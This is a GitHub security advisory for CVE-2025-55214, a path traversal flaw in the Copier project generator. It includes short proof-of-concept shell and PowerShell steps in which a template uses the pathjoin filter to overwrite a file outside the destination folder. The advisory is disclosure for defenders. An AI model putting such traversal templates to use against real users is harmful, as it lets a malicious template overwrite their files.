# [M] Copier's safe template has filesystem write access outside destination path

## Summary
Severity: Medium
Advisory: GHSA-p7q8-grrj-3m8w
CVE: CVE-2025-55214
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-08-18
Source: https://github.com/advisories/GHSA-p7q8-grrj-3m8w
Type: github-advisory

## Affected
- PyPI: `copier` — affected >=7.1.0 <9.9.1

## Details
### Impact

Copier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently write files outside the destination path where a project shall be generated or updated. This is possible when rendering a [generated directory structure](https://copier.readthedocs.io/en/stable/configuring/#generating-a-directory-structure) whose rendered path is either a relative parent path or an absolute path. Constructing such paths is possible using Copier's builtin `pathjoin` Jinja filter and its builtin `_copier_conf.sep` variable, which is the platform-native path separator. This way, a malicious template author can create a template that overwrites arbitrary files (according to the user's write permissions), e.g., to cause havoc.

#### Write access via generated relative path

Reproducible example:

```shell
echo "foo" > forbidden.txt
mkdir src/
echo "bar" > "src/{{ pathjoin('..', 'forbidden.txt') }}"
uvx copier copy src/ dst/
cat forbidden.txt
```

#### Write access via generated absolute path

Reproducible example:

- POSIX:

    ```shell
    # Assumption: The current working directory is `/tmp/test-copier-vulnerability/`
    echo "foo" > forbidden.txt
    mkdir src/
    echo "bar" > "src/{{ pathjoin(_copier_conf.sep, 'tmp', 'test-copier-vulnerability', 'forbidden.txt') }}"
    uvx --from copier python -O -m copier copy --overwrite src/ dst/
    cat forbidden.txt
    ```

- Windows (PowerShell):

    ```powershell
    # Assumption: The current working directory is `C:\Users\<user>\Temp\test-copier-vulnerability`
    echo "foo" > forbidden.txt
    mkdir src
    Set-Content -Path src\copier.yml @'
    drive:
      type: str
      default: "C:"
      when: false
    '@
    echo "bar" > "src\{{ pathjoin(drive, 'Users', '<user>', 'Temp', 'test-copier-vulnerability', 'forbidden.txt') }}"
    uvx --from copier python -O -m copier copy --overwrite src dst
    cat forbidden.txt
    ```

This scenario is slightly less severe, as Copier has a few [assertions of the destination path being relative](https://github.com/copier-org/copier/blob/d106ea543fd26e1ac1b9a3dcef3e99cc70fdf57c/copier/_main.py#L747) which would typically be raised. But `python -O` (or `PYTHONOPTIMIZE=x`) removes asserts, so these guards may be ineffective. In addition, this scenario will prompt for overwrite confirmation or require the `--overwrite` flag for non-interactive mode; yet malicious file writes might go unnoticed.

## References
- https://github.com/copier-org/copier/security/advisories/GHSA-p7q8-grrj-3m8w
- https://nvd.nist.gov/vuln/detail/CVE-2025-55214
- https://github.com/copier-org/copier/commit/fdbc0167cc22780b497e4db176feaf6f024757d6
- https://github.com/copier-org/copier
